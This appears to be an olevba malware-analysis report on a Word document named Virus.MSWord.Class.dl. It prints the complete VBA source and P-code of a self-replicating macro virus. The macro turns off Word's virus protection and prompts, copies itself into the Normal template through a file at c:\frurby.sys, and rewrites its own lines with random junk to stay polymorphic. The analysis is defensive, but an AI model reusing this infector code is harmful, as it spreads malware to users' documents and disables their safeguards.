olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.dl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.dl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
DF1 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UIL = QBN + KGN
Options.VirusProtection = 0
OFG = SSM + VUE
Options.SaveNormalPrompt = 0
PVF = LCV + OAM
Application.EnableCancelKey = 0
CCR = GBG + IGU
CK41 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
VIG = DDO + JJP
Options.ConfirmConversions = 0
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set PQ45 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
LR35 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set PQ45 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
OG28 = True
OLS = BEO + JHD
End If
PUL = BQI + KKE
If OG28 = True Then
HCM = DUC + JGT
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\frurby.sys"
QGO = FBA + HRG
PQ45.CodeModule.AddFromFile ("c:\frurby.sys")
FKF = HAK + ETM
PQ45.CodeModule.deletelines 1, 4
QUH = LBN + JVC
PQ45.CodeModule.replaceline 1, "Sub Document_Close()"
UNH = DKE + VCA
ElseIf LR35 = True Then
HMU = LIS + SOP
PQ45.CodeModule.AddFromFile ("c:\frurby.sys")
VHK = JPD + JLR
PQ45.CodeModule.deletelines 1, 4
LJL = FNK + OTI
End If
GGD = LEM + HTK
With PQ45.CodeModule
EPQ = NRD + REV
For x = 2 To (PQ45.CodeModule.CountOfLines - 2) Step 2
BBR = IKC + CDB
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
PLM = EKQ + QIT
Next x
QBN = PAJ + IGV
End With
RPJ = QGH + JUC
FP22:
OHC = EBJ + VLK
    MsgBox "Birthday of Furby"
VEI = IGL + DLV
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.dl
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7786 bytes
' Line #0:
' 	FuncDefn (Sub Document_Open())
' Line #1:
' 	Ld GGR 
' 	Ld AQR 
' 	Add 
' 	St PLM 
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld SRI 
' 	Ld VTB 
' 	Add 
' 	St PAJ 
' Line #4:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St DF1 
' Line #5:
' 	Ld QBN 
' 	Ld KGN 
' 	Add 
' 	St UIL 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	Ld SSM 
' 	Ld VUE 
' 	Add 
' 	St OFG 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	Ld LCV 
' 	Ld OAM 
' 	Add 
' 	St PVF 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	Ld GBG 
' 	Ld IGU 
' 	Add 
' 	St CCR 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St CK41 
' Line #13:
' 	Ld DDO 
' 	Ld JJP 
' 	Add 
' 	St VIG 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #15:
' 	Ld EMB 
' 	Ld KTF 
' 	Add 
' 	St HNE 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld UNN 
' 	Ld JCM 
' 	Add 
' 	St RIG 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set PQ45 
' Line #19:
' 	Ld ALU 
' 	Ld JOL 
' 	Add 
' 	St PUS 
' Line #20:
' 	LitVarSpecial (True)
' 	St LR35 
' Line #21:
' 	Ld IFB 
' 	Ld FVB 
' 	Add 
' 	St LKH 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld DKF 
' 	Ld NLD 
' 	Add 
' 	St IIK 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld ICR 
' 	Ld KQN 
' 	Add 
' 	St UOL 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set PQ45 
' Line #27:
' 	Ld BCH 
' 	Ld CAL 
' 	Add 
' 	St SAE 
' Line #28:
' 	LitVarSpecial (True)
' 	St OG28 
' Line #29:
' 	Ld BEO 
' 	Ld JHD 
' 	Add 
' 	St OLS 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld BQI 
' 	Ld KKE 
' 	Add 
' 	St PUL 
' Line #32:
' 	Ld OG28 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #33:
' 	Ld DUC 
' 	Ld JGT 
' 	Add 
' 	St HCM 
' Line #34:
' 	LitStr 0x000D "c:\frurby.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	Ld FBA 
' 	Ld HRG 
' 	Add 
' 	St QGO 
' Line #36:
' 	LitStr 0x000D "c:\frurby.sys"
' 	Paren 
' 	Ld PQ45 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #37:
' 	Ld HAK 
' 	Ld ETM 
' 	Add 
' 	St FKF 
' Line #38:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld PQ45 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #39:
' 	Ld LBN 
' 	Ld JVC 
' 	Add 
' 	St QUH 
' Line #40:
' 	LitDI2 0x0001 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	Ld PQ45 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #41:
' 	Ld DKE 
' 	Ld VCA 
' 	Add 
' 	St UNH 
' Line #42:
' 	Ld LR35 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #43:
' 	Ld LIS 
' 	Ld SOP 
' 	Add 
' 	St HMU 
' Line #44:
' 	LitStr 0x000D "c:\frurby.sys"
' 	Paren 
' 	Ld PQ45 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #45:
' 	Ld JPD 
' 	Ld JLR 
' 	Add 
' 	St VHK 
' Line #46:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld PQ45 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #47:
' 	Ld FNK 
' 	Ld OTI 
' 	Add 
' 	St LJL 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld LEM 
' 	Ld HTK 
' 	Add 
' 	St GGD 
' Line #50:
' 	StartWithExpr 
' 	Ld PQ45 
' 	MemLd CodeModule 
' 	With 
' Line #51:
' 	Ld NRD 
' 	Ld REV 
' 	Add 
' 	St EPQ 
' Line #52:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld PQ45 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #53:
' 	Ld IKC 
' 	Ld CDB 
' 	Add 
' 	St BBR 
' Line #54:
' 	Ld x 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #55:
' 	Ld EKQ 
' 	Ld QIT 
' 	Add 
' 	St PLM 
' Line #56:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Ld PAJ 
' 	Ld IGV 
' 	Add 
' 	St QBN 
' Line #58:
' 	EndWith 
' Line #59:
' 	Ld QGH 
' 	Ld JUC 
' 	Add 
' 	St RPJ 
' Line #60:
' 	Label FP22 
' Line #61:
' 	Ld EBJ 
' 	Ld VLK 
' 	Add 
' 	St OHC 
' Line #62:
' 	LitStr 0x0011 "Birthday of Furby"
' 	ArgsCall MsgBox 0x0001 
' Line #63:
' 	Ld IGL 
' 	Ld DLV 
' 	Add 
' 	St VEI 
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

